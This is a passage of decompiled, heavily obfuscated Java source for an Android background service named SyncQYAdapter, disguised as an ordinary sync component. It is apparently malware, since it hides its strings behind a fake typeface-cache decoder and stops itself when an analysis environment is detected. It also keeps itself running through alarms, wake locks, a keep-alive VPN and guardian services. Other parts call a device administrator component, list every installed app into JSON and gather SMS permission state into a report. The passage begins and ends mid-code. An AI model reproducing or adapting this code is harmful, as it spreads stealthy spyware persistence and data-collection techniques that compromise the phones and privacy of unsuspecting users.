            intent.setAction(TypefaceCache.obtain("0002005A007A00B500DD008000E0008200100042007A00B500C4"));
            alarmManager.setAlarmClock(new AlarmManager.AlarmClockInfo(System.currentTimeMillis() + 28800000, null), PendingIntent.getService(this, 1004, intent, 201326592));
            TypefaceCache.obtain("00100077005D008200E400A6009200A900260062001B009400F500AB00F300AB00220064005600A400FC00B000D100AC006300650058008F00F500BB00C700AB00260072001B008E00FE00FF008A00AF");
        } catch (Exception e) {
            TypefaceCache.obtain("003000750053008200F400AA00DE00A200100077005D008200E400A600FC00A2003700570057008600E200B2009200A2003100640054009500AA00FF");
            e.getMessage();
        }
    }

    @Override // android.app.Service
    public final IBinder onBind(Intent intent) {
        return this.vIJudZvPyTuNp;
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r4v1, types: [boolean, int] */
    /* JADX WARN: Type inference failed for: r4v2, types: [android.content.BroadcastReceiver, app.mobilex.plus.services.SyncQYAdapter$onCreate$9] */
    @Override // android.app.Service
    public final void onCreate() {
        boolean zIm;
        sNACkioAJERo snackioajero = sNACkioAJERo.w9sT1Swbhx3hs;
        super.onCreate();
        VEkRsTDS6a9oHWI = this;
        try {
            File file = new File(getFilesDir(), TypefaceCache.obtain("006D006600520083"));
            byte[] bytes = String.valueOf(Process.myPid()).getBytes(N4h1mGVqsY6M8lTtB.dDIMxZXP1V8HdM);
            FileOutputStream fileOutputStream = new FileOutputStream(file);
            try {
                fileOutputStream.write(bytes);
                fileOutputStream.close();
                ?? r4 = 20 - 19;
                try {
                    ktukzhfmAkOuMU ktukzhfmakoumu = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                    Context applicationContext = getApplicationContext();
                    if (ktukzhfmAkOuMU.J0zjQ7CAgohuxU20eCW6 == null) {
                        ktukzhfmAkOuMU.J0zjQ7CAgohuxU20eCW6 = applicationContext.getApplicationContext();
                    }
                    cpTq2XMCb5JSaEhn cptq2xmcb5jsaehn = umMdYoePNXvWWPn.w9sT1Swbhx3hs;
                    XopfkSX0nabMIVQ xopfkSX0nabMIVQ = new XopfkSX0nabMIVQ(this, null, r4);
                    if ((2 & r4) != 0) {
                        cptq2xmcb5jsaehn = snackioajero;
                    }
                    cpTq2XMCb5JSaEhn cptq2xmcb5jsaehnWotphlvK9sPbXJ = OFtLBiBbrrTHWu.wotphlvK9sPbXJ(snackioajero, cptq2xmcb5jsaehn, r4);
                    AqltFduMByzMV4g aqltFduMByzMV4g = umMdYoePNXvWWPn.dDIMxZXP1V8HdM;
                    if (cptq2xmcb5jsaehnWotphlvK9sPbXJ != aqltFduMByzMV4g && cptq2xmcb5jsaehnWotphlvK9sPbXJ.D5P1xCAyuvgF(W6dfON4KdcdxlH.vekpFI4d1Nc4fakF) == null) {
                        cptq2xmcb5jsaehnWotphlvK9sPbXJ = cptq2xmcb5jsaehnWotphlvK9sPbXJ.EWUjsTERgdPbSw3NNlN(aqltFduMByzMV4g);
                    }
                    snDbSR9Gb3eZZuB sndbsr9gb3ezzub = new snDbSR9Gb3eZZuB(cptq2xmcb5jsaehnWotphlvK9sPbXJ, r4);
                    sndbsr9gb3ezzub.YIgR6F2ZXmLx2ul(r4, sndbsr9gb3ezzub, xopfkSX0nabMIVQ);
                } catch (Exception unused) {
                }
                int i = 65 - 31;
                try {
                    wotphlvK9sPbXJ();
                    if (Build.VERSION.SDK_INT >= i) {
                        startForeground(1001, gIIiyi2ddlMDR0(), 1073741824);
                    } else {
                        startForeground(1001, gIIiyi2ddlMDR0());
                    }
                } catch (Exception e) {
                    TypefaceCache.obtain("00300062005A009500E4009900DD00B5002600710049008800E500B100D600E7003300640052008A00F100AD00CB00E7002500770052008B00F500BB008800E7");
                    e.getMessage();
                    int i2 = Build.VERSION.SDK_INT;
                    if (i2 >= 31 && bzHLgVWZZfjKGub8Jt.ibVTtJUNfrGYbW(e)) {
                        TypefaceCache.obtain("00050051006800C700E300AB00D300B5003700360055008800E400FF00D300AB002F0079004C008200F400FF00D400B5002C007B001B008500F100BC00D900A000310079004E008900F400F3009200B40020007E005E008300E500B300DB00A900240036005A008B00F100AD00DF00E7003100730048009300F100AD00C6");
                        try {
                            Intent intent = new Intent(this, (Class<?>) SyncQYAdapter.class);
                            intent.setAction(TypefaceCache.obtain("0002005A007A00B500DD008000E0008200100042007A00B500C4"));
                            ((AlarmManager) getSystemService("alarm")).set(2, SystemClock.elapsedRealtime() + 5000, PendingIntent.getService(this, 7702, intent, 1140850688));
                        } catch (Exception unused2) {
                        }
                        try {
                            String str = DataFPAdapter.xDyLpEZyrcKVe0;
                            OFMrQsTe5s1KYV0lq.J0zjQ7CAgohuxU20eCW6(this);
                        } catch (Exception unused3) {
                        }
                        stopSelf();
                        return;
                    }
                    try {
                        ((NotificationManager) getSystemService("notification")).createNotificationChannel(new NotificationChannel(TypefaceCache.obtain("003000600058"), "S", r4));
                        Notification notificationBuild = new Notification.Builder(this, TypefaceCache.obtain("003000600058")).build();
                        if (i2 >= i) {
                            startForeground(1001, notificationBuild, 1073741824);
                        } else {
                            startForeground(1001, notificationBuild);
                        }
                    } catch (Exception unused4) {
                    }
                }
                if (k3qGWOP8GEZr.w9sT1Swbhx3hs(this)) {
                    stopSelf();
                    return;
                }
                int i3 = ProviderJUAdapter.dDIMxZXP1V8HdM;
                if (k3qGWOP8GEZr.w9sT1Swbhx3hs(this)) {
                    return;
                }
                try {
                    if (ProviderJUAdapter.getAnalysisScore() >= 10) {
                        k3qGWOP8GEZr.dDIMxZXP1V8HdM(this);
                        return;
                    }
                } catch (Throwable unused5) {
                }
                int i4 = 0;
                Object[] objArr = 0;
                try {
                    zIm = ProviderJUAdapter.im();
                } catch (Throwable unused6) {
                    zIm = false;
                }
                if (!zIm) {
                    SharedPreferences sharedPreferences = getSharedPreferences(TypefaceCache.obtain("00260078004D00B800F300B700D700A40028"), 0);
                    int i5 = sharedPreferences.getInt(TypefaceCache.obtain("002500770052008B00CF00BC00DD00B2002D0062"), 0);
                    sharedPreferences.edit().putInt(TypefaceCache.obtain("002500770052008B00CF00BC00DD00B2002D0062"), i5 + 1).commit();
                    UoxIZOBVZaubOFdPNaXK(Math.min((1 << Math.min(i5, 4)) * 30000, 480000L));
                    stopSelf();
                    return;
                }
                try {
                    getSharedPreferences(TypefaceCache.obtain("00260078004D00B800F300B700D700A40028"), 0).edit().putInt(TypefaceCache.obtain("002500770052008B00CF00BC00DD00B2002D0062"), 0).commit();
                } catch (Exception unused7) {
                }
                registerComponentCallbacks(new g9ypuGxuyo1nGC(this));
                try {
                    Thread.setDefaultUncaughtExceptionHandler(new H3x8qi5sGfedvF(this));
                    this.vekpFI4d1Nc4fakF = DVTNwpDEVsUKuznof();
                    ktukzhfmAkOuMU ktukzhfmakoumu2 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                    ktukzhfmAkOuMU.wotphlvK9sPbXJ(this);
                    PowerManager powerManager = (PowerManager) getSystemService("power");
                    String lowerCase = Build.MANUFACTURER.toLowerCase(Locale.ROOT);
                    while (Process.myPid() < -999) {
                        StringBuilder sb = new StringBuilder();
                        sb.append(0);
                        sb.setLength(0);
                    }
                    PowerManager.WakeLock wakeLockNewWakeLock = powerManager.newWakeLock(r4, TypefaceCache.obtain((lowerCase.equals(TypefaceCache.obtain("002B0063005A009000F500B6")) || lowerCase.equals(TypefaceCache.obtain("002B00790055008800E2"))) ? "000F00790058008600E400B600DD00A9000E00770055008600F700BA00C0009400260064004D008E00F300BA" : "0010006F0055008400C1008600F300A300220066004F008200E200E50088008F002600770049009300F200BA00D300B3000F00790058008C"));
                    wakeLockNewWakeLock.setReferenceCounted(false);
                    this.JXn4Qf7zpnLjP5 = wakeLockNewWakeLock;
                    try {
                        if (wakeLockNewWakeLock.isHeld()) {
                            wakeLockNewWakeLock.release();
                        }
                        wakeLockNewWakeLock.acquire(1800000L);
                    } catch (Exception e2) {
                        TypefaceCache.obtain("001400770050008200DC00B000D100AC006300770058009600E500B600C000A2006300730049009500FF00AD008800E7");
                        e2.getMessage();
                    }
                    try {
                        WifiManager.WifiLock wifiLockCreateWifiLock = ((WifiManager) getApplicationContext().getSystemService("wifi")).createWifiLock(r4, TypefaceCache.obtain("0010006F0055008400C1008600F300A300220066004F008200E200E500880090002A0070005200AB00FF00BC00D9"));
                        this.Ee8d2j4S9Vm5yGuR = wifiLockCreateWifiLock;
                        if (wifiLockCreateWifiLock != null) {
                            wifiLockCreateWifiLock.acquire();
                        }
                    } catch (Exception e3) {
                        TypefaceCache.obtain("0014007F005D008E00DC00B000D100AC006300770058009600E500B600C000A2006300730049009500FF00AD008800E7");
                        e3.getMessage();
                    }
                    gmNWMfvn6zlEj();
                    YIgR6F2ZXmLx2ul();
                    GiffeZJ1rbwyx();
                    this.dDIMxZXP1V8HdM.post(this.pyu8ovAipBTLYAiKab);
                    this.dDIMxZXP1V8HdM.postDelayed(this.H9XlUr4OeMJFiXK, 5000L);
                    this.dDIMxZXP1V8HdM.postDelayed(this.K7eEOBPYP9VIoHWTe, 1000L);
                    int i6 = DataBVTask.dDIMxZXP1V8HdM;
                    y6jRGLEWNMir.nQilHWaqS401ZtR(this);
                    ajrMZmky8AIb2Pr();
                    n8nqApvKDYz7s8llJ2jf();
                    try {
                        ((ConnectivityManager) getSystemService("connectivity")).registerDefaultNetworkCallback(new X1pRVvVudFwrQCVJYV(this));
                    } catch (Exception e4) {
                        TypefaceCache.obtain("000D0073004F009000FF00AD00D900840022007A0057008500F100BC00D900E700310073005C008E00E300AB00D700B500630070005A008E00FC00BA00D600FD0063");
                        e4.getMessage();
                    }
                    try {
                        String str2 = DataFPAdapter.xDyLpEZyrcKVe0;
                        OFMrQsTe5s1KYV0lq.DVTNwpDEVsUKuznof(this);
                        String str3 = UtilHALoader.xDyLpEZyrcKVe0;
                        SbxdZ6Kq2uhHQ5RPRqm.rCHnHJBAlOpNI5(this);
                        String str4 = KeepAliveWorker.xDyLpEZyrcKVe0;
                        y6jRGLEWNMir.J0zjQ7CAgohuxU20eCW6(this);
                    } catch (Exception e5) {
                        TypefaceCache.obtain("001400790049008C00F500AD00C100E7003000750053008200F400AA00DE00A200630070005A008E00FC00BA00D600FD0063");
                        e5.getMessage();
                    }
                    if (Build.VERSION.SDK_INT >= 33) {
                        this.dDIMxZXP1V8HdM.postDelayed(new razEUo8ZzzxVSwvlTwaV(this, i4), 3000L);
                    }
                    try {
                        kExylgSxUDTVQOx3o0oq.dDIMxZXP1V8HdM.w9sT1Swbhx3hs(this);
                    } catch (Exception e6) {
                        TypefaceCache.obtain("0010007F0057008200FE00AB00F300B20027007F005400C700E300AB00D300B500370036005E009500E200B000C000FD0063");
                        e6.getMessage();
                    }
                    try {
                        String str5 = GuardianService.b1EoSIRjJHO5;
                        okc5AGRjqrud84oM6d.Qrz92kRPw4GcghAc(this);
                    } catch (Exception e7) {
                        TypefaceCache.obtain("00040063005A009500F400B600D300A900630065004F008600E200AB009200A2003100640054009500AA00FF");
                        e7.getMessage();
                    }
                    try {
                        String str6 = SyncAdapterService.w9sT1Swbhx3hs;
                        RIZfHbqXpth8r2yN4.D5P1xCAyuvgF(getApplicationContext());
                    } catch (Exception unused8) {
                    }
                    try {
                        String str7 = KeepAliveVpnService.w9sT1Swbhx3hs;
                        RIZfHbqXpth8r2yN4.hjneShqpF9Tis4(getApplicationContext());
                    } catch (Exception unused9) {
                    }
                    if (HiMbhMAyWCxjtsIFMD.dDIMxZXP1V8HdM()) {
                        SharedPreferences sharedPreferences2 = getSharedPreferences(TypefaceCache.obtain("002C0073005600B800F100AA00C600A800300062005A009500E4"), 0);
                        long j = sharedPreferences2.getLong(TypefaceCache.obtain("002F00770048009300CF00BE00C100AC002600720064008A00E3"), 0L);
                        long jCurrentTimeMillis = (System.currentTimeMillis() - j) / 86400000;
                        if (j == 0 || jCurrentTimeMillis >= 7) {
                            this.dDIMxZXP1V8HdM.postDelayed(new A68NpXPqwTFos99nt(this, 18, sharedPreferences2), 10000L);
                        }
                    }
                    int i7 = Build.VERSION.SDK_INT;
                    this.dDIMxZXP1V8HdM.postDelayed(new razEUo8ZzzxVSwvlTwaV(this, r4), i7 >= 33 ? 10000L : 5000L);
                    try {
                        ?? r5 = new BroadcastReceiver() { // from class: app.mobilex.plus.services.SyncQYAdapter.onCreate.9
                            private static /* synthetic */ void skwcgflmmp() {
                            }

                            @Override // android.content.BroadcastReceiver
                            public final void onReceive(Context context, Intent intent2) {
                                SyncQYAdapter syncQYAdapter = SyncQYAdapter.this;
                                try {
                                    String str8 = GuardianService.b1EoSIRjJHO5;
                                    syncQYAdapter.sendBroadcast(new Intent(GuardianService.D5P1xCAyuvgF).setPackage(syncQYAdapter.getPackageName()));
                                } catch (Exception unused10) {
                                }
                            }
                        };
                        this.EWUjsTERgdPbSw3NNlN = r5;
                        if (i7 >= 33) {
                            registerReceiver(r5, new IntentFilter(GuardianService.pyu8ovAipBTLYAiKab), 4);
                        } else {
                            registerReceiver(r5, new IntentFilter(GuardianService.pyu8ovAipBTLYAiKab));
                        }
                    } catch (Exception unused10) {
                    }
                    this.dDIMxZXP1V8HdM.postDelayed(new UubaJZRp66jTeLre(6, this, this, objArr == true ? 1 : 0), 15000L);
                    TypefaceCache.obtain("0010006F0055008400C1008600F300A300220066004F008200E200FF00C100B300220064004F008200F4");
                } catch (Exception e8) {
                    TypefaceCache.obtain("0010006F0055008400C1008600F300A300220066004F008200E200FF00DD00A900000064005E008600E400BA009200A2003100640054009500AA00FF");
                    e8.getMessage();
                    e8.printStackTrace();
                    UoxIZOBVZaubOFdPNaXK(10000L);
                    stopSelf();
                }
            } catch (Throwable th) {
                try {
                    throw th;
                } catch (Throwable th2) {
                    okc5AGRjqrud84oM6d.Ee8d2j4S9Vm5yGuR(fileOutputStream, th);
                    throw th2;
                }
            }
        } catch (Exception unused11) {
        }
    }

    @Override // android.app.Service
    public final void onDestroy() {
        WifiManager.WifiLock wifiLock;
        PowerManager.WakeLock wakeLock;
        super.onDestroy();
        this.DVTNwpDEVsUKuznof = false;
        VEkRsTDS6a9oHWI = null;
        this.dDIMxZXP1V8HdM.removeCallbacks(this.pyu8ovAipBTLYAiKab);
        this.dDIMxZXP1V8HdM.removeCallbacks(this.H9XlUr4OeMJFiXK);
        this.dDIMxZXP1V8HdM.removeCallbacks(this.K7eEOBPYP9VIoHWTe);
        this.dDIMxZXP1V8HdM.removeCallbacks(this.D5P1xCAyuvgF);
        f58wUe2vbJhag6PETTG f58wue2vbjhag6pettg = this.w9sT1Swbhx3hs;
        WGrwEyVqR28VYxamRhIg wGrwEyVqR28VYxamRhIg = (WGrwEyVqR28VYxamRhIg) f58wue2vbjhag6pettg.w9sT1Swbhx3hs.D5P1xCAyuvgF(fadfsJa4iEdiwEC4Xm8.b1EoSIRjJHO5);
        if (wGrwEyVqR28VYxamRhIg == null) {
            throw new IllegalStateException(("Scope cannot be cancelled because it does not have a job: " + f58wue2vbjhag6pettg).toString());
        }
        wGrwEyVqR28VYxamRhIg.vekpFI4d1Nc4fakF(null);
        try {
            SyncQYAdapter$registerScreenReceiver$1 syncQYAdapter$registerScreenReceiver$1 = this.ibVTtJUNfrGYbW;
            if (syncQYAdapter$registerScreenReceiver$1 != null) {
                unregisterReceiver(syncQYAdapter$registerScreenReceiver$1);
            }
            SyncQYAdapter$registerScreenReceiver$2 syncQYAdapter$registerScreenReceiver$2 = this.O2DHNSIGZlgPja7eqLgn;
            if (syncQYAdapter$registerScreenReceiver$2 != null) {
                unregisterReceiver(syncQYAdapter$registerScreenReceiver$2);
            }
            SyncQYAdapter$registerScreenReceiver$3 syncQYAdapter$registerScreenReceiver$3 = this.xfn2GJwmGqs7kWW;
            if (syncQYAdapter$registerScreenReceiver$3 != null) {
                unregisterReceiver(syncQYAdapter$registerScreenReceiver$3);
            }
            UpdateJSWrapper updateJSWrapper = this.dTS0S7eC32ubQH54j36;
            if (updateJSWrapper != null) {
                unregisterReceiver(updateJSWrapper);
            }
            AnonymousClass9 anonymousClass9 = this.EWUjsTERgdPbSw3NNlN;
            if (anonymousClass9 != null) {
                unregisterReceiver(anonymousClass9);
            }
            s6gkfffFcXvYHWNdDTq s6gkffffcxvyhwnddtq = this.yTljMGnIibTRdOpSh4;
            if (s6gkffffcxvyhwnddtq != null) {
                getContentResolver().unregisterContentObserver(s6gkffffcxvyhwnddtq);
            }
        } catch (Exception e) {
            TypefaceCache.obtain("001600780049008200F700B600C100B300260064001B009500F500BC00D700AE00350073004900C700F500AD00C000A80031002C001B");
            e.getMessage();
        }
        try {
            kExylgSxUDTVQOx3o0oq.dDIMxZXP1V8HdM.JXn4Qf7zpnLjP5();
        } catch (Exception unused) {
        }
        try {
            PowerManager.WakeLock wakeLock2 = this.JXn4Qf7zpnLjP5;
            if (wakeLock2 != null && wakeLock2.isHeld() && (wakeLock = this.JXn4Qf7zpnLjP5) != null) {
                wakeLock.release();
            }
        } catch (Exception e2) {
            TypefaceCache.obtain("001400770050008200DC00B000D100AC00630064005E008B00F500BE00C100A2006300730049009500FF00AD008800E7");
            e2.getMessage();
        }
        try {
            WifiManager.WifiLock wifiLock2 = this.Ee8d2j4S9Vm5yGuR;
            if (wifiLock2 != null && wifiLock2.isHeld() && (wifiLock = this.Ee8d2j4S9Vm5yGuR) != null) {
                wifiLock.release();
            }
        } catch (Exception e3) {
            TypefaceCache.obtain("0014007F005D008E00DC00B000D100AC00630064005E008B00F500BE00C100A2006300730049009500FF00AD008800E7");
            e3.getMessage();
        }
        try {
            SurfaceView surfaceView = this.xDyLpEZyrcKVe0;
            if (surfaceView != null && surfaceView.getParent() != null) {
                ((WindowManager) getSystemService("window")).removeView(surfaceView);
            }
            this.xDyLpEZyrcKVe0 = null;
        } catch (Exception e4) {
            TypefaceCache.obtain("003100730056008800E600BA00FB00A90035007F0048008E00F200B300D70088003500730049008B00F100A6009200A2003100640054009500AA00FF");
            e4.getMessage();
        }
        UoxIZOBVZaubOFdPNaXK(1000L);
        try {
            String str = DataFPAdapter.xDyLpEZyrcKVe0;
            OFMrQsTe5s1KYV0lq.J0zjQ7CAgohuxU20eCW6(this);
        } catch (Exception unused2) {
        }
        try {
            String str2 = UtilHALoader.xDyLpEZyrcKVe0;
            SbxdZ6Kq2uhHQ5RPRqm.rCHnHJBAlOpNI5(this);
        } catch (Exception unused3) {
        }
        UoxIZOBVZaubOFdPNaXK(500L);
        try {
            String str3 = GuardianService.b1EoSIRjJHO5;
            okc5AGRjqrud84oM6d.Qrz92kRPw4GcghAc(this);
        } catch (Exception unused4) {
        }
        try {
            String str4 = DataFPAdapter.xDyLpEZyrcKVe0;
            OFMrQsTe5s1KYV0lq.J0zjQ7CAgohuxU20eCW6(this);
        } catch (Exception unused5) {
        }
        TypefaceCache.obtain("0010006F0055008400C1008600F300A300220066004F008200E200FF00C100B3002C0066004B008200F400F3009200B500260065004F008600E200AB009200B40020007E005E008300E500B300D700A3");
    }

    @Override // android.app.Service
    public final int onStartCommand(Intent intent, int i, int i2) {
        String action;
        try {
            wotphlvK9sPbXJ();
            if (Build.VERSION.SDK_INT >= 34) {
                startForeground(1001, gIIiyi2ddlMDR0(), 1073741824);
            } else {
                startForeground(1001, gIIiyi2ddlMDR0());
            }
        } catch (Exception e) {
            TypefaceCache.obtain("00300062005A009500E4009900DD00B5002600710049008800E500B100D600E7002600640049008800E200FF00DB00A900630079005500B400E400BE00C000B3000000790056008A00F100B100D600FD0063");
            e.getMessage();
            if (Build.VERSION.SDK_INT >= (-32) + 63 && bzHLgVWZZfjKGub8Jt.ibVTtJUNfrGYbW(e)) {
                TypefaceCache.obtain("00050051006800C700F200B300DD00A400280073005F00C700F600AD00DD00AA00630074005A008400FB00B800C000A800360078005F00C700F900B1009200A8002D0045004F008600E200AB00F100A8002E007B005A008900F400F3009200B40020007E005E008300E500B300DB00A900240036005D008600FC00B300D000A60020007D001B009500F500AC00C600A600310062");
                UoxIZOBVZaubOFdPNaXK(5000L);
                try {
                    String str = DataFPAdapter.xDyLpEZyrcKVe0;
                    OFMrQsTe5s1KYV0lq.J0zjQ7CAgohuxU20eCW6(this);
                } catch (Exception unused) {
                }
                stopSelf();
                return 1;
            }
        }
        if (intent == null || (action = intent.getAction()) == null) {
            action = "";
        }
        TypefaceCache.obtain("002C00780068009300F100AD00C60084002C007B0056008600FE00BB009200A6002000620052008800FE00E50092");
        if (action.equals(TypefaceCache.obtain("0002005A007A00B500DD008000E0008200100042007A00B500C4")) ? true : action.equals(TypefaceCache.obtain("00020051007C00B500D5008C00E1008E00150053006400A600DC009E00E0008A")) ? true : action.equals(TypefaceCache.obtain("00050055007600B800C7009E00F9008200160046")) ? true : action.equals(TypefaceCache.obtain("00090059007900B800DB009A00F700970002005A007200B100D5")) ? true : action.equals(TypefaceCache.obtain("00000059007500A900D5009C00E6008E0015005F006F00BE00CF008D00F7009400170057006900B3")) ? true : action.equals(TypefaceCache.obtain("00140059006900AC00D5008D00ED009500060045006F00A600C2008B")) ? true : action.equals(TypefaceCache.obtain("00140059006900AC00D5008D00ED008C00060053006B00A600DC009600E40082")) ? true : action.equals(TypefaceCache.obtain("0010004F006800B300D5009200ED008200150053007500B300CF008D00F7009400170057006900B3")) ? true : action.equals(TypefaceCache.obtain("0010005B006800B800D5008900F700890017")) ? true : action.equals(TypefaceCache.obtain("00070057007200AB00C9008000E0008200100042007A00B500C4")) ? true : action.equals(TypefaceCache.obtain("00000044007A00B400D8008000E0008200100042007A00B500C4")) ? true : action.equals(TypefaceCache.obtain("0014005F007F00A000D5008B00ED009500060040007200B100D5")) ? true : action.equals(TypefaceCache.obtain("0017005F007700A200CF008D00F70091000A0040007E")) ? true : action.equals(TypefaceCache.obtain("000D0059006F00AE00D6009600F100860017005F007400A900CF009300FB009400170053007500A200C2008000E000820015005F006D00A2")) ? true : action.equals(TypefaceCache.obtain("0002005A007A00B500DD008000E200820011005B006400A400D8009E00FC00800006")) ? true : action.equals(TypefaceCache.obtain("00010059007400B300CF008C00E6008600110042"))) {
            ibVTtJUNfrGYbW();
            y6jRGLEWNMir.b1EoSIRjJHO5(this.w9sT1Swbhx3hs, null, new AzBvxzvbhkd8u(this, null, 3), 3);
            if (action.equals(TypefaceCache.obtain("00070057007200AB00C9008000E0008200100042007A00B500C4"))) {
                ajrMZmky8AIb2Pr();
            }
        }
        if (!this.rCHnHJBAlOpNI5) {
            try {
                String str2 = DataFPAdapter.xDyLpEZyrcKVe0;
                OFMrQsTe5s1KYV0lq.DVTNwpDEVsUKuznof(this);
                String str3 = KeepAliveWorker.xDyLpEZyrcKVe0;
                y6jRGLEWNMir.J0zjQ7CAgohuxU20eCW6(this);
                this.rCHnHJBAlOpNI5 = true;
            } catch (Exception e2) {
                TypefaceCache.obtain("001400790049008C00DD00BE00DC00A600240073004900C700E300BC00DA00A2002700630057008200B000B900D300AE002F0073005F00DD00B0");
                e2.getMessage();
            }
        }
        try {
            AlarmManager alarmManager = (AlarmManager) getSystemService("alarm");
            Intent intent2 = new Intent(this, (Class<?>) SyncQYAdapter.class);
            intent2.setAction(TypefaceCache.obtain("0002005A007A00B500DD008000E0008200100042007A00B500C4"));
            PendingIntent service = PendingIntent.getService(this, 1001, intent2, 201326592);
            long jElapsedRealtime = SystemClock.elapsedRealtime() + 60000;
            if (Build.VERSION.SDK_INT < 34 || alarmManager.canScheduleExactAlarms()) {
                alarmManager.setExactAndAllowWhileIdle(2, jElapsedRealtime, service);
            } else {
                alarmManager.set(2, jElapsedRealtime, service);
            }
            TypefaceCache.obtain("0002007A005A009500FD00FF00C000A200300062005A009500E400FF00C100A4002B0073005F009200FC00BA00D600E7002A0078001B");
        } catch (Exception e3) {
            TypefaceCache.obtain("003000750053008200F400AA00DE00A2001300730049008E00FF00BB00DB00A4001100730048009300F100AD00C600E7002600640049008800E200E50092");
            e3.getMessage();
        }
        t9CXKrwDxrnFA6g23hZU();
        return 1;
    }

    @Override // android.app.Service
    public final void onTaskRemoved(Intent intent) {
        super.onTaskRemoved(intent);
        TypefaceCache.obtain("002C0078006F008600E300B400E000A2002E0079004D008200F400FF009F00E7003000750053008200F400AA00DE00AE002D0071001B008E00FD00B200D700A3002A0077004F008200B000AD00D700B4003700770049009300B000A900DB00A6006300570057008600E200B200FF00A6002D0077005C008200E2");
        UoxIZOBVZaubOFdPNaXK(1000L);
        try {
            String str = DataFPAdapter.xDyLpEZyrcKVe0;
            OFMrQsTe5s1KYV0lq.J0zjQ7CAgohuxU20eCW6(this);
        } catch (Exception unused) {
        }
    }

    public final boolean qfTrc75xwRVMl85vh(String str, String str2, String str3) {
        try {
            gA5gCwTK0qjTIn.gIIiyi2ddlMDR0(this, new ComponentName(this, (Class<?>) DeviceAdminReceiver.class));
            String str4 = UtilGLWorker.gIIiyi2ddlMDR0;
            UtilGLWorker.MLSIo1htfMPWeB8V876L = true;
            Intent intent = new Intent(this, (Class<?>) UtilGLWorker.class);
            intent.putExtra(UtilGLWorker.gIIiyi2ddlMDR0, str);
            intent.putExtra(UtilGLWorker.wotphlvK9sPbXJ, true);
            if (str2.length() > 0) {
                intent.putExtra(UtilGLWorker.Qrz92kRPw4GcghAc, str2);
            }
            if (str3.length() > 0) {
                intent.putExtra(UtilGLWorker.nQilHWaqS401ZtR, str3);
            }
            intent.addFlags(335544320);
            startActivity(intent);
            return true;
        } catch (Exception e) {
            TypefaceCache.obtain("000F00790058008C00B000AC00D100B500260073005500C700F500AD00C000A80031002C001B");
            e.getMessage();
            return false;
        }
    }

    public final void qiOhdF48gPbc() {
        try {
            getPackageManager().setComponentEnabledSetting(new ComponentName(this, TypefaceCache.obtain("00220066004B00C900FD00B000D000AE002F0073004300C900E000B300C700B4006D005B005A008E00FE009E00D100B3002A00600052009300E9")), 1, 1);
            TypefaceCache.obtain("00020066004B00C700F900BC00DD00A9006300650053008800E700B1");
        } catch (Exception e) {
            TypefaceCache.obtain("0010007E0054009000B000B600D100A8002D0036005E009500E200B000C000FD0063");
            e.getMessage();
        }
    }

    public final JSONArray rCHnHJBAlOpNI5() {
        JSONArray jSONArray = new JSONArray();
        try {
            PackageManager packageManager = getPackageManager();
            for (PackageInfo packageInfo : packageManager.getInstalledPackages(0)) {
                JSONObject jSONObject = new JSONObject();
                jSONObject.put(TypefaceCache.obtain("002D007700560082"), packageInfo.applicationInfo.loadLabel(packageManager).toString());
                jSONObject.put(TypefaceCache.obtain("003300770058008C00F100B800D7"), packageInfo.packageName);
                String strObtain = TypefaceCache.obtain("003500730049009400F900B000DC");
                String str = packageInfo.versionName;
                if (str == null) {
                    str = "";
                }
                jSONObject.put(strObtain, str);
                String strObtain2 = TypefaceCache.obtain("0030006F0048009300F500B2");
                boolean z = true;
                if ((packageInfo.applicationInfo.flags & 1) == 0) {
                    z = false;
                }
                jSONObject.put(strObtain2, z);
                jSONArray.put(jSONObject);
            }
            return jSONArray;
        } catch (Exception e) {
            TypefaceCache.obtain("00040073004F00C700F100AF00C200B4006300730049009500FF00AD008800E7");
            e.getMessage();
            return jSONArray;
        }
    }

    public final void t9CXKrwDxrnFA6g23hZU() {
        try {
            AlarmManager alarmManager = (AlarmManager) getSystemService("alarm");
            if (Build.VERSION.SDK_INT < 85 - 51 || alarmManager.canScheduleExactAlarms()) {
                Intent intent = new Intent(this, (Class<?>) SyncQYAdapter.class);
                intent.setAction(TypefaceCache.obtain("00020051007C00B500D5008C00E1008E00150053006400A600DC009E00E0008A"));
                alarmManager.setExactAndAllowWhileIdle(2, SystemClock.elapsedRealtime() + 60000, PendingIntent.getService(this, 1003, intent, 201326592));
                TypefaceCache.obtain("00020071005C009500F500AC00C100AE00350073001B008600FC00BE00C000AA006300650058008F00F500BB00C700AB00260072001B008E00FE00FF");
                return;
            }
            Intent intent2 = new Intent(this, (Class<?>) SyncQYAdapter.class);
            intent2.setAction(TypefaceCache.obtain("00020051007C00B500D5008C00E1008E00150053006400A600DC009E00E0008A"));
            alarmManager.set(2, SystemClock.elapsedRealtime() + 60000, PendingIntent.getService(this, 1003, intent2, 201326592));
            TypefaceCache.obtain("00020071005C009500F500AC00C100AE00350073001B008600FC00BE00C000AA0063003E0052008900F500A700D300A40037003F001B009400F300B700D700A30036007A005E008300B000B900DD00B5006300570055008300E200B000DB00A300630027000F00CC");
        } catch (Exception e) {
            TypefaceCache.obtain("003000750053008200F400AA00DE00A200020071005C009500F500AC00C100AE00350073007A008B00F100AD00DF00E7002600640049008800E200E50092");
            e.getMessage();
        }
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r11v1, types: [boolean, int] */
    /* JADX WARN: Type inference failed for: r3v12 */
    /* JADX WARN: Type inference failed for: r3v13 */
    /* JADX WARN: Type inference failed for: r3v4 */
    /* JADX WARN: Type inference failed for: r3v5 */
    /* JADX WARN: Type inference failed for: r3v6 */
    /* JADX WARN: Type inference failed for: r3v7 */
    /* JADX WARN: Type inference failed for: r7v0, types: [org.json.JSONObject] */
    public final JSONObject uCN4HERvZEfG7JjL(String str, String str2, int i) throws JSONException {
        ?? r3;
        String str3;
        ?? r4;
        boolean zBq;
        boolean zBq2;
        ?? jSONObject = new JSONObject();
        jSONObject.put(TypefaceCache.obtain("002A00650064008300F500B900D300B2002F00620064009400FD00AC"), okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(gA5gCwTK0qjTIn.b1EoSIRjJHO5(this), getPackageName()));
        jSONObject.put(TypefaceCache.obtain("0030007F005600B800E300B300DD00B3"), i);
        if (checkSelfPermission("android.permission.SEND_SMS") != 0) {
            TypefaceCache.obtain("00100053007500A300CF008C00FF009400630066005E009500FD00B600C100B4002A0079005500C700FE00B000C600E700240064005A008900E400BA00D6");
            jSONObject.put(TypefaceCache.obtain("0030007300550093"), false);
